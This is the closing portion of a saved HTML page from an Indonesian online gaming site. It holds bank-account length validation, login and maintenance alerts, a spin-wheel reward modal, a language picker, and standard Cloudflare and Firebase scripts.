                        val = val.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
                    }
                    return val;
                }

                window.getRandomIntInclusive =  function (min, max) {
                    min = Math.ceil(min);
                    max = Math.floor(max);
                    return Math.floor(Math.random() * (max - min + 1)) + min; //The maximum is inclusive and the minimum is inclusive
                }

                /*bank acc min and maxlength limitation */
                window.accLength = parseInt("8");
                    window.bankAccLength =function(selectedBank, default_minlength, default_maxlength){
                        console.log(selectedBank, default_minlength, default_maxlength);
                        var   custom_minLength, custom_maxLength;
                if(selectedBank == 'MDR' || selectedBank == 'MDRLV'){
                    custom_minLength = 13;
                    custom_maxLength = 13;
                }
                else if(selectedBank == 'BNI' || selectedBank == 'BCA' || selectedBank == 'BSI' || selectedBank == 'BLA'){
                    custom_minLength = 10;
                    custom_maxLength = 10;
                } 
                else if(selectedBank == 'BRI'){
                    custom_minLength = 15;
                    custom_maxLength = 15;
                } 
                else if(selectedBank == 'DMN'){
                    custom_minLength = 10;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'BPDSULTENG'){
                    custom_minLength = 10;
                    custom_maxLength = 15;
                }
                else if(selectedBank == 'ALADIN' || selectedBank == 'ALLO'){
                    custom_minLength = 10;
                    custom_maxLength = 13;
                } 
                else if(selectedBank == 'JAGO' || selectedBank == 'ARIN'){
                    custom_minLength = 8;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'CIMBN' || selectedBank == 'SEABANK'){
                    custom_minLength = 12;
                    custom_maxLength = 12;
                }  
                else{
                    custom_minLength  = default_minlength;
                    custom_maxLength  = default_maxlength; 
                }   
                
                return {'min_len': custom_minLength,'max_len': custom_maxLength}
                    }
                /*bank acc min and maxlength limitation end*/ 


  $(document).ready(function () {
                    //suspend-alert
                   // login-alert
                   // promo-disabled-alert
                   // "maintenance-alert";
                   // "comingsoon-alert";
                window.alertLogin=function(e){
                    e.preventDefault();
                    sweetAlert( transMsgs.plsLogin  );
                    return false;
                }

                $(".suspend-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.blockedFrGame);
                        return false;
                });

                $(".login-alert").click(function (e) {
                    if($("#login-modal--layout").length && !$('#loginForm').hasClass('js-inline-form') ){
                         $("#login-modal--layout").nifty("show")
                    }
                    else {
                        alertLogin(e);
                    }

                    return false;
                });

                $(".maintenance-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameMaintenance);
                        return false;
                });

                $(".comingsoon-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameComingSoon);
                        return false;
                });

                $(".promo-disabled-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert(transMsgs.gamePromoBlock);
                        return false;
                });


               
                $("#login-modal--layout").on('shown.nifty.modal', function(){
                    window.loadOrRefreshTurnstileWidget('loginTurnstileWidget' ); 
                });
 
        });


        $("input").focus(function() {
          $("body").addClass("input-focused");
        });
        $("input").focusout(function() {
          $("body").removeClass("input-focused");
        });

        // popup banner
        var isLoggedIn = window.isAuth;
        var isClosedPopUp = isLoggedIn ? sessionStorage.getItem('isClosedPopUpAftLogin') : sessionStorage.getItem('isClosedPopUp');
        
        if(!isClosedPopUp){
                    }
</script>


<script defer="" type="text/javascript" src="/assets/js/firebase10d9.js"> </script>


 
  <div class="reward-program-popup"></div>
<div class="claimed-reward-popup"></div>
<div class="redeem-ticket-popup"></div>

<!-- spin-wheel modal -->
<div class="modal-wrapper nifty-modal fade-in-scale" id="spin-wheel-modal--layout" data-isnotcloseoverlay="true">
	<div class="md-content"> 
		<div class="md-body"> 
		<div class="modal-header text-center headerModal">
			<button class="btn btn-link closeBtn" id="btn-close--spin-wheel-modal"> X </button>
			</div>
			<div class="flex spinWheelWrapper text-center">
            <!-- spin-wheel type -->
            <input type="hidden" id="spin_wheel_type" value="">

              <div class="spinWheelTitle">Spin Wheel</div>
              <div>untuk mendapatkan koin atau lainnya</div>
              
              <div class="spinWheel">
                <div class=" inline-flex" style="position: relative;">
                  <canvas id="wheelCanvas" width="280" height="280"></canvas>
                  <div class="spinWheelArrow"></div>
                </div>
              </div>
            </div>
			<div class="flex" style=" place-content: center; ">
                <button class="btn btn-block btn-primary " id="spinBtn">
				 Coba Keberuntungan Anda                </button>
            </div>
        </div>
	</div>
</div>
<div class="md-overlay"></div>
<!-- end of spin-wheel modal -->
  <script type="text/javascript" src="/assets/js/ugsports/app_mobile.js"> </script>
  <!--License TNC Modal -->
<!--License TNC Modal -->

<!--Language Option Modal -->
<div class="nifty-modal slide-in-bottom " id="langModal-mobile">
  <div class="md-content">
    <div class="md-body">
      <div class="wrap language">
        <div class="title">Wilayah dan bahasa</div>
        <table class="table-borderless"> 
        
          <tbody><tr>
            <td class="country">Indonesia</td>
            <td></td>
            <td></td>
          </tr>
          <tr>
            <td class="flag-wrap">
              <div class="circle-id"></div>
            </td>
                        <td class="i  ">
            <a href="#" onclick="changeLang(&quot;id&quot;)"> indonesian</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;en&quot;)"> English</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;cn&quot;)"> Mandarin</a>
            </td>

                      </tr> 
     
        </tbody></table>
      </div>
    </div>
  </div>
</div>
<div class="md-overlay"></div>
<!--END Language Option Modal -->
 
<script>
$(document).ready(function () {
  });
 function changeLang(key){
      change_lang(key)
  }
  $('.btn-refresh-captcha').on( 'click', function(e){
e.preventDefault();
e.stopPropagation(); 
var $captchaImg = $(this).parent().find('img');
var curCapUrl = $captchaImg .attr("data-url");
var url = curCapUrl + Date.now() + Math.floor(Math.random() * 100000000);
$captchaImg.attr("src",url);

});



</script>





  

  <script type="text/javascript">
    $(document).ready(function(){
      if( window.location.href.indexOf('reLogin=yes') >= 0  &&  !window.isAuth){
        $("#btnToggleRSideNav").trigger('click');
      }
    });
  </script>

  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;7d12d7f7aaea43fcb293a94830587466&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>




<veepn-lock-screen><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-lock-screen><iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" tabindex="-1" vspace="0" width="100%" aria-hidden="true" id="I0_1771962515738" name="I0_1771962515738" src="https://api-kixplay-live1.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw&amp;appName=%5BDEFAULT%5D&amp;v=11.3.0&amp;eid=p&amp;usegapi=1&amp;jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.id.8ECc3i-niIA.O%2Fd%3D1%2Frs%3DAHpOoo8g466w4vfctJFQ7iHLN0dzTSqREg%2Fm%3D__features__#id=I0_1771962515738&amp;_gfid=I0_1771962515738&amp;parent=https%3A%2F%2Ffriteusecuisine.com&amp;pfname=&amp;rpctoken=11796035" style="position: absolute; top: -100px; width: 1px; height: 1px;"></iframe></body></html>